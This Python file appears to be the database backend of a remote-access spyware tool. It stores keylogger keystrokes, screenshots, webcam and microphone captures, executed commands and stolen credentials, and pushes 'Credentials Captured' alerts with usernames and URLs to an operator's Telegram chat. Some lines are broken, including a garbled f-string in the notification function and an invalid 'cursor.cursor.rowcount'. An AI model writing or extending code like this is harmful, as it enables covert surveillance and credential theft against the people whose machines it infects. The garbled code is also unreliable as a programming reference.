#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sqlite_db.py - SQLite database manager with Telegram integration
"""

import sqlite3
import json
import hashlib
import os
import time
import threading
from typing import Dict, List, Optional, Tuple, Any, Union
from pathlib import Path
from datetime import datetime
from contextlib import contextmanager

# Import logger
from ..utils.logger import get_logger

logger = get_logger()

class SQLiteManager:
    """Manages SQLite database operations with encryption and Telegram notifications"""
    
    def __init__(self, db_path: str = None, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Database path
        if db_path is None:
            db_path = self.config.get('db_path', 'data/derboesekollege.db')
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self.db_path = db_path
        
        # Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()
        
        # Encryption
        self.encryption_enabled = self.config.get('encryption', {}).get('enabled', False)
        self.encryption_key = self.config.get('encryption', {}).get('key')
        
        # Connection pool
        self.connections = {}
        self.lock = threading.RLock()
        
        # Initialize database
        self._initialize_database()
        
        logger.info(f"SQLite manager initialized: {self.db_path}", module="sqlite")
    
    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('db_chat_id')
        
        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.db_chat_id = chat_id
                logger.info("Telegram database bot initialized", module="sqlite")
            except ImportError:
                logger.warning("Telegram module not available", module="sqlite")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="sqlite")
    
    def send_telegram_notification(self, title: str, message: str):
        """Send database notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'db_chat_id'):
            return
        
        try:
            full_message = fb>🗄️ {b>\n\n{message}"
            self.telegram_bot.send_message(
                chat_id=self.db_chat_id,
                text=full_message,
                parse_mode='HTML'
            )
            logger.debug(f"Telegram database notification sent: {title}", module="sqlite")
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="sqlite")
    
    @contextmanager
    def get_connection(self, thread_safe: bool = True):
        """Get database connection with context manager"""
        thread_id = threading.get_ident() if thread_safe else 'main'
        
        with self.lock:
            if thread_id not in self.connections:
                conn = sqlite3.connect(
                    self.db_path,
                    check_same_thread=False,
                    timeout=30.0
                )
                conn.row_factory = sqlite3.Row
                self.connections[thread_id] = conn
                logger.debug(f"New database connection created for thread {thread_id}", module="sqlite")
            
            conn = self.connections[thread_id]
        
        try:
            yield conn
        except Exception as e:
            logger.error(f"Database connection error: {e}", module="sqlite")
            raise
        finally:
            # Don't close connection, keep it in pool
            pass
    
    def _initialize_database(self):
        """Initialize database with required tables"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                # Enable WAL mode for better concurrency
                cursor.execute("PRAGMA journal_mode=WAL")
                cursor.execute("PRAGMA synchronous=NORMAL")
                cursor.execute("PRAGMA foreign_keys=ON")
                
                # Create tables
                self._create_tables(cursor)
                
                conn.commit()
                logger.info("Database initialized successfully", module="sqlite")
                
                # Send Telegram notification
                self.send_telegram_notification(
                    "Database Initialized",
                    f"Path: {self.db_path}\n"
                    f"Size: {os.path.getsize(self.db_path) if os.path.exists(self.db_path) else 0} bytes"
                )
                
        except Exception as e:
            logger.error(f"Database initialization error: {e}", module="sqlite")
            raise
    
    def _create_tables(self, cursor):
        """Create all required tables"""
        
        # System information table
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS system_info (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            hostname TEXT,
            platform TEXT,
            cpu_cores INTEGER,
            memory_total INTEGER,
            disk_total INTEGER,
            ip_address TEXT,
            mac_address TEXT,
            data JSON
        )
        """)
        
        # Network scan results
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS network_scans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            scan_type TEXT,
            target_range TEXT,
            duration REAL,
            hosts_found INTEGER,
            results JSON
        )
        """)
        
        # Process information
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS processes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            pid INTEGER,
            name TEXT,
            username TEXT,
            cpu_percent REAL,
            memory_percent REAL,
            cmdline TEXT,
            exe_path TEXT,
            status TEXT
        )
        """)
        
        # File operations
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS file_operations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            operation TEXT,
            source_path TEXT,
            destination_path TEXT,
            file_size INTEGER,
            hash_md5 TEXT,
            hash_sha256 TEXT,
            success BOOLEAN,
            error_message TEXT
        )
        """)
        
        # Command execution history
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS command_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            command TEXT,
            arguments TEXT,
            return_code INTEGER,
            stdout TEXT,
            stderr TEXT,
            execution_time REAL,
            user TEXT
        )
        """)
        
        # Telegram interactions
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS telegram_interactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            chat_id INTEGER,
            user_id INTEGER,
            username TEXT,
            message_id INTEGER,
            command TEXT,
            response TEXT,
            processing_time REAL
        )
        """)
        
        # Keylogger data (if enabled)
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS keylogger_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            window_title TEXT,
            process_name TEXT,
            keystrokes TEXT,
            screenshot_path TEXT,
            encrypted BOOLEAN DEFAULT 0
        )
        """)
        
        # Screenshots
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            path TEXT,
            width INTEGER,
            height INTEGER,
            size INTEGER,
            hash TEXT,
            thumbnail_path TEXT,
            tags TEXT
        )
        """)
        
        # Webcam captures
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS webcam_captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            path TEXT,
            camera_index INTEGER,
            resolution TEXT,
            size INTEGER,
            hash TEXT,
            duration REAL
        )
        """)
        
        # Microphone recordings
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS audio_recordings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            path TEXT,
            duration REAL,
            sample_rate INTEGER,
            channels INTEGER,
            size INTEGER,
            hash TEXT,
            format TEXT
        )
        """)
        
        # Network traffic
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS network_traffic (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            source_ip TEXT,
            destination_ip TEXT,
            source_port INTEGER,
            destination_port INTEGER,
            protocol TEXT,
            packet_size INTEGER,
            payload_hash TEXT,
            direction TEXT,
            encrypted BOOLEAN DEFAULT 0
        )
        """)
        
        # Credentials (encrypted)
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            source TEXT,
            username TEXT,
            password_encrypted TEXT,
            url TEXT,
            application TEXT,
            additional_info TEXT,
            compromised BOOLEAN DEFAULT 0
        )
        """)
        
        # Indexes for performance
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_system_info_timestamp ON system_info(timestamp)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_processes_timestamp ON processes(timestamp)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_command_history_timestamp ON command_history(timestamp)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_telegram_interactions_timestamp ON telegram_interactions(timestamp)")
        
        logger.debug("Database tables created/verified", module="sqlite")
    
    def _encrypt_data(self, data: str) -> str:
        """Encrypt data if encryption is enabled"""
        if not self.encryption_enabled or not self.encryption_key:
            return data
        
        try:
            from ..utils.encryption import get_encryption_manager
            encryptor = get_encryption_manager({'key': self.encryption_key})
            return encryptor.encrypt_string(data)
        except Exception as e:
            logger.error(f"Data encryption error: {e}", module="sqlite")
            return data
    
    def _decrypt_data(self, encrypted_data: str) -> str:
        """Decrypt data if encryption is enabled"""
        if not self.encryption_enabled or not self.encryption_key:
            return encrypted_data
        
        try:
            from ..utils.encryption import get_encryption_manager
            encryptor = get_encryption_manager({'key': self.encryption_key})
            return encryptor.decrypt_string(encrypted_data)
        except Exception as e:
            logger.error(f"Data decryption error: {e}", module="sqlite")
            return encrypted_data
    
    def insert_system_info(self, info: Dict[str, Any]) -> int:
        """Insert system information"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                data_json = json.dumps(info.get('data', {}))
                
                cursor.execute("""
                INSERT INTO system_info 
                (hostname, platform, cpu_cores, memory_total, disk_total, 
                 ip_address, mac_address, data)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    info.get('hostname'),
                    info.get('platform'),
                    info.get('cpu_cores'),
                    info.get('memory_total'),
                    info.get('disk_total'),
                    info.get('ip_address'),
                    info.get('mac_address'),
                    data_json
                ))
                
                row_id = cursor.lastrowid
                conn.commit()
                
                logger.debug(f"System info inserted with ID: {row_id}", module="sqlite")
                return row_id
                
        except Exception as e:
            logger.error(f"Error inserting system info: {e}", module="sqlite")
            return -1
    
    def insert_network_scan(self, scan_type: str, target_range: str, 
                          results: List[Dict]) -> int:
        """Insert network scan results"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                results_json = json.dumps(results)
                hosts_found = len(results)
                
                cursor.execute("""
                INSERT INTO network_scans 
                (scan_type, target_range, hosts_found, results)
                VALUES (?, ?, ?, ?)
                """, (scan_type, target_range, hosts_found, results_json))
                
                row_id = cursor.lastrowid
                conn.commit()
                
                # Send Telegram notification for large scans
                if hosts_found > 10:
                    self.send_telegram_notification(
                        "Network Scan Completed",
                        f"Type: {scan_type}\n"
                        f"Target: {target_range}\n"
                        f"Hosts found: {hosts_found}"
                    )
                
                logger.debug(f"Network scan inserted with ID: {row_id}", module="sqlite")
                return row_id
                
        except Exception as e:
            logger.error(f"Error inserting network scan: {e}", module="sqlite")
            return -1
    
    def insert_process(self, process_info: Dict[str, Any]) -> int:
        """Insert process information"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                cmdline = json.dumps(process_info.get('cmdline', []))
                
                cursor.execute("""
                INSERT INTO processes 
                (pid, name, username, cpu_percent, memory_percent, 
                 cmdline, exe_path, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    process_info.get('pid'),
                    process_info.get('name'),
                    process_info.get('username'),
                    process_info.get('cpu_percent'),
                    process_info.get('memory_percent'),
                    cmdline,
                    process_info.get('exe_path'),
                    process_info.get('status')
                ))
                
                row_id = cursor.lastrowid
                conn.commit()
                
                logger.debug(f"Process inserted with ID: {row_id}", module="sqlite")
                return row_id
                
        except Exception as e:
            logger.error(f"Error inserting process: {e}", module="sqlite")
            return -1
    
    def insert_command(self, command: str, args: str, return_code: int,
                      stdout: str, stderr: str, exec_time: float, 
                      user: str = None) -> int:
        """Insert command execution record"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                # Truncate long output
                if len(stdout) > 10000:
                    stdout = stdout[:10000] + "... [TRUNCATED]"
                if len(stderr) > 10000:
                    stderr = stderr[:10000] + "... [TRUNCATED]"
                
                cursor.execute("""
                INSERT INTO command_history 
                (command, arguments, return_code, stdout, stderr, 
                 execution_time, user)
                VALUES (?, ?, ?, ?, ?, ?, ?)
                """, (command, args, return_code, stdout, stderr, 
                      exec_time, user))
                
                row_id = cursor.lastrowid
                conn.commit()
                
                # Send Telegram notification for failed commands
                if return_code != 0:
                    self.send_telegram_notification(
                        "Command Execution Failed",
                        f"Command: {command}\n"
                        f"Return Code: {return_code}\n"
                        f"Error: {stderr[:200]}"
                    )
                
                logger.debug(f"Command inserted with ID: {row_id}", module="sqlite")
                return row_id
                
        except Exception as e:
            logger.error(f"Error inserting command: {e}", module="sqlite")
            return -1
    
    def insert_telegram_interaction(self, chat_id: int, user_id: int, 
                                  username: str, message_id: int,
                                  command: str, response: str, 
                                  processing_time: float) -> int:
        """Insert Telegram interaction record"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                INSERT INTO telegram_interactions 
                (chat_id, user_id, username, message_id, command, 
                 response, processing_time)
                VALUES (?, ?, ?, ?, ?, ?, ?)
                """, (chat_id, user_id, username, message_id, 
                      command, response, processing_time))
                
                row_id = cursor.lastrowid
                conn.commit()
                
                logger.debug(f"Telegram interaction inserted with ID: {row_id}", module="sqlite")
                return row_id
                
        except Exception as e:
            logger.error(f"Error inserting Telegram interaction: {e}", module="sqlite")
            return -1
    
    def insert_file_operation(self, operation: str, source_path: str,
                            dest_path: str, file_size: int, success: bool,
                            error: str = None) -> int:
        """Insert file operation record"""
        try:
            # Calculate file hashes
            hash_md5 = ''
            hash_sha256 = ''
            
            if os.path.exists(source_path) and os.path.isfile(source_path):
                try:
                    # Calculate MD5
                    hasher_md5 = hashlib.md5()
                    with open(source_path, 'rb') as f:
                        for chunk in iter(lambda: f.read(4096), b''):
                            hasher_md5.update(chunk)
                    hash_md5 = hasher_md5.hexdigest()
                    
                    # Calculate SHA256
                    hasher_sha256 = hashlib.sha256()
                    with open(source_path, 'rb') as f:
                        for chunk in iter(lambda: f.read(4096), b''):
                            hasher_sha256.update(chunk)
                    hash_sha256 = hasher_sha256.hexdigest()
                except Exception as e:
                    logger.warning(f"Could not calculate file hash: {e}", module="sqlite")
            
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                INSERT INTO file_operations 
                (operation, source_path, destination_path, file_size, 
                 hash_md5, hash_sha256, success, error_message)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """, (operation, source_path, dest_path, file_size,
                      hash_md5, hash_sha256, success, error))
                
                row_id = cursor.lastrowid
                conn.commit()
                
                # Send Telegram notification for large file operations
                if file_size > 10 * 1024 * 1024:  # 10 MB
                    self.send_telegram_notification(
                        "Large File Operation",
                        f"Operation: {operation}\n"
                        f"Source: {source_path}\n"
                        f"Size: {file_size/(1024*1024):.2f} MB\n"
                        f"Success: {success}"
                    )
                
                logger.debug(f"File operation inserted with ID: {row_id}", module="sqlite")
                return row_id
                
        except Exception as e:
            logger.error(f"Error inserting file operation: {e}", module="sqlite")
            return -1
    
    def insert_screenshot(self, path: str, width: int, height: int,
                         size: int, thumbnail_path: str = None,
                         tags: List[str] = None) -> int:
        """Insert screenshot record"""
        try:
            # Calculate hash
            file_hash = ''
            if os.path.exists(path):
                hasher = hashlib.sha256()
                with open(path, 'rb') as f:
                    for chunk in iter(lambda: f.read(4096), b''):
                        hasher.update(chunk)
                file_hash = hasher.hexdigest()
            
            tags_str = ','.join(tags) if tags else ''
            
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                INSERT INTO screenshots 
                (path, width, height, size, hash, thumbnail_path, tags)
                VALUES (?, ?, ?, ?, ?, ?, ?)
                """, (path, width, height, size, file_hash, 
                      thumbnail_path, tags_str))
                
                row_id = cursor.lastrowid
                conn.commit()
                
                logger.debug(f"Screenshot inserted with ID: {row_id}", module="sqlite")
                return row_id
                
        except Exception as e:
            logger.error(f"Error inserting screenshot: {e}", module="sqlite")
            return -1
    
    def insert_credentials(self, source: str, username: str, password: str,
                          url: str = None, application: str = None,
                          additional_info: str = None) -> int:
        """Insert credentials (password is encrypted)"""
        try:
            password_encrypted = self._encrypt_data(password)
            
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                INSERT INTO credentials 
                (source, username, password_encrypted, url, application, 
                 additional_info)
                VALUES (?, ?, ?, ?, ?, ?)
                """, (source, username, password_encrypted, url, 
                      application, additional_info))
                
                row_id = cursor.lastrowid
                conn.commit()
                
                # Send Telegram notification for credentials
                self.send_telegram_notification(
                    "Credentials Captured",
                    f"Source: {source}\n"
                    f"Username: {username}\n"
                    f"Application: {application or 'Unknown'}\n"
                    f"URL: {url or 'N/A'}"
                )
                
                logger.debug(f"Credentials inserted with ID: {row_id}", module="sqlite")
                return row_id
                
        except Exception as e:
            logger.error(f"Error inserting credentials: {e}", module="sqlite")
            return -1
    
    def query(self, table: str, conditions: Dict = None, 
             limit: int = 100, offset: int = 0) -> List[Dict]:
        """Query data from table"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                query = f"SELECT * FROM {table}"
                params = []
                
                if conditions:
                    where_clauses = []
                    for key, value in conditions.items():
                        if isinstance(value, (list, tuple)):
                            placeholders = ','.join(['?'] * len(value))
                            where_clauses.append(f"{key} IN ({placeholders})")
                            params.extend(value)
                        else:
                            where_clauses.append(f"{key} = ?")
                            params.append(value)
                    
                    if where_clauses:
                        query += " WHERE " + " AND ".join(where_clauses)
                
                query += " ORDER BY timestamp DESC"
                query += f" LIMIT ? OFFSET ?"
                params.extend([limit, offset])
                
                cursor.execute(query, params)
                rows = cursor.fetchall()
                
                # Convert to list of dicts
                results = []
                for row in rows:
                    result = dict(row)
                    
                    # Decrypt encrypted fields
                    if table == 'credentials' and 'password_encrypted' in result:
                        result['password'] = self._decrypt_data(result['password_encrypted'])
                        del result['password_encrypted']
                    
                    # Parse JSON fields
                    for key, value in result.items():
                        if isinstance(value, str) and value.startswith('{') and value.endswith('}'):
                            try:
                                result[key] = json.loads(value)
                            except:
                                pass
                    
                    results.append(result)
                
                logger.debug(f"Query returned {len(results)} rows from {table}", module="sqlite")
                return results
                
        except Exception as e:
            logger.error(f"Query error: {e}", module="sqlite")
            return []
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get database statistics"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                stats = {
                    'database_size': os.path.getsize(self.db_path) if os.path.exists(self.db_path) else 0,
                    'tables': {}
                }
                
                # Get row counts for each table
                tables = [
                    'system_info', 'network_scans', 'processes', 
                    'file_operations', 'command_history', 'telegram_interactions',
                    'keylogger_data', 'screenshots', 'webcam_captures',
                    'audio_recordings', 'network_traffic', 'credentials'
                ]
                
                for table in tables:
                    try:
                        cursor.execute(f"SELECT COUNT(*) FROM {table}")
                        count = cursor.fetchone()[0]
                        stats['tables'][table] = count
                    except:
                        stats['tables'][table] = 0
                
                # Get database info
                cursor.execute("PRAGMA page_count")
                page_count = cursor.fetchone()[0]
                cursor.execute("PRAGMA page_size")
                page_size = cursor.fetchone()[0]
                
                stats['page_count'] = page_count
                stats['page_size'] = page_size
                stats['estimated_size'] = page_count * page_size
                
                logger.debug(f"Database statistics collected", module="sqlite")
                return stats
                
        except Exception as e:
            logger.error(f"Statistics error: {e}", module="sqlite")
            return {}
    
    def backup(self, backup_path: str = None) -> bool:
        """Create database backup"""
        try:
            if backup_path is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                backup_path = f"data/backups/derboesekollege_backup_{timestamp}.db"
            
            os.makedirs(os.path.dirname(backup_path), exist_ok=True)
            
            with self.get_connection() as conn:
                # Use SQLite backup API
                backup_conn = sqlite3.connect(backup_path)
                conn.backup(backup_conn)
                backup_conn.close()
            
            backup_size = os.path.getsize(backup_path)
            
            # Send Telegram notification
            self.send_telegram_notification(
                "Database Backup Created",
                f"Backup path: {backup_path}\n"
                f"Size: {backup_size/(1024*1024):.2f} MB\n"
                f"Original size: {os.path.getsize(self.db_path)/(1024*1024):.2f} MB"
            )
            
            logger.info(f"Database backup created: {backup_path} ({backup_size} bytes)", module="sqlite")
            return True
            
        except Exception as e:
            logger.error(f"Backup error: {e}", module="sqlite")
            return False
    
    def vacuum(self) -> bool:
        """Optimize database (VACUUM)"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("VACUUM")
                conn.commit()
            
            logger.info("Database vacuum completed", module="sqlite")
            return True
            
        except Exception as e:
            logger.error(f"Vacuum error: {e}", module="sqlite")
            return False
    
    def cleanup_old_data(self, days_to_keep: int = 30) -> int:
        """Cleanup old data"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                
                # Calculate cutoff date
                cutoff_date = datetime.now().timestamp() - (days_to_keep * 24 * 60 * 60)
                cutoff_datetime = datetime.fromtimestamp(cutoff_date).strftime('%Y-%m-%d %H:%M:%S')
                
                tables = [
                    'system_info', 'network_scans', 'processes',
                    'file_operations', 'command_history', 'telegram_interactions',
                    'keylogger_data', 'screenshots', 'webcam_captures',
                    'audio_recordings', 'network_traffic'
                ]
                
                total_deleted = 0
                for table in tables:
                    cursor.execute(f"""
                    DELETE FROM {table} 
                    WHERE timestamp < ?
                    """, (cutoff_datetime,))
                    
                    deleted = cursor.cursor.rowcount
                    total_deleted += deleted
                    logger.debug(f"Deleted {deleted} rows from {table}", module="sqlite")
                
                conn.commit()
                
                # Send Telegram notification
                if total_deleted > 0:
                    self.send_telegram_notification(
                        "Database Cleanup",
                        f"Deleted {total_deleted} rows\n"
                        f"Older than {days_to_keep} days"
                    )
                
                logger.info(f"Cleanup completed: {total_deleted} rows deleted", module="sqlite")
                return total_deleted
                
        except Exception as e:
            logger.error(f"Cleanup error: {e}", module="sqlite")
            return 0
    
    def export_to_json(self, table: str, output_file: str = None) -> bool:
        """Export table data to JSON"""
        try:
            if output_file is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_file = f"data/exports/{table}_{timestamp}.json"
            
            os.makedirs(os.path.dirname(output_file), exist_ok=True)
            
            # Query all data
            data = self.query(table, limit=1000000)  # Large limit for export
            
            # Write to JSON
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, default=str)
            
            file_size = os.path.getsize(output_file)
            
            logger.info(f"Exported {len(data)} rows from {table} to {output_file} ({file_size} bytes)", module="sqlite")
            return True
            
        except Exception as e:
            logger.error(f"Export error: {e}", module="sqlite")
            return False
    
    def close_all_connections(self):
        """Close all database connections"""
        with self.lock:
            for thread_id, conn in list(self.connections.items()):
                try:
                    conn.close()
                    logger.debug(f"Closed database connection for thread {thread_id}", module="sqlite")
                except:
                    pass
            self.connections.clear()
    
    def get_status(self) -> Dict[str, Any]:
        """Get database manager status"""
        stats = self.get_statistics()
        
        return {
            'database_path': self.db_path,
            'database_size': stats.get('database_size', 0),
            'total_rows': sum(stats.get('tables', {}).values()),
            'tables': len(stats.get('tables', {})),
            'encryption_enabled': self.encryption_enabled,
            'active_connections': len(self.connections),
            'telegram_available': self.telegram_bot is not None
        }

# Global instance
_sqlite_manager = None

def get_sqlite_manager(db_path: str = None, config: Dict = None) -> SQLiteManager:
    """Get or create SQLite manager instance"""
    global _sqlite_manager
    
    if _sqlite_manager is None:
        _sqlite_manager = SQLiteManager(db_path, config)
    
    return _sqlite_manager

if __name__ == "__main__":
    # Test the SQLite manager
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'db_chat_id': 123456789
        }
    }
    
    manager = get_sqlite_manager('test.db', config)
    
    # Test insert operations
    print("Testing database operations...")
    
    # Insert system info
    system_info = {
        'hostname': 'test-pc',
        'platform': 'Windows',
        'cpu_cores': 8,
        'memory_total': 16 * 1024**3,  # 16 GB
        'disk_total': 500 * 1024**3,  # 500 GB
        'ip_address': '192.168.1.100',
        'mac_address': '00:11:22:33:44:55',
        'data': {'os_version': '10.0.19044'}
    }
    
    sys_id = manager.insert_system_info(system_info)
    print(f"System info inserted with ID: {sys_id}")
    
    # Insert command
    cmd_id = manager.insert_command(
        command='dir',
        args='/w',
        return_code=0,
        stdout='Directory listing...',
        stderr='',
        exec_time=0.5,
        user='testuser'
    )
    print(f"Command inserted with ID: {cmd_id}")
    
    # Query data
    print("\nQuerying system info...")
    systems = manager.query('system_info', limit=5)
    print(f"Found {len(systems)} system records")
    
    # Get statistics
    print("\nDatabase statistics:")
    stats = manager.get_statistics()
    print(f"Database size: {stats.get('database_size', 0)/(1024*1024):.2f} MB")
    print(f"Table counts: {stats.get('tables', {})}")
    
    # Show status
    status = manager.get_status()
    print(f"\n🗄️ SQLite Manager Status: {status}")
    
    # Cleanup
    manager.close_all_connections()
    if os.path.exists('test.db'):
        os.remove('test.db')
    
    print("\n✅ SQLite tests completed!")
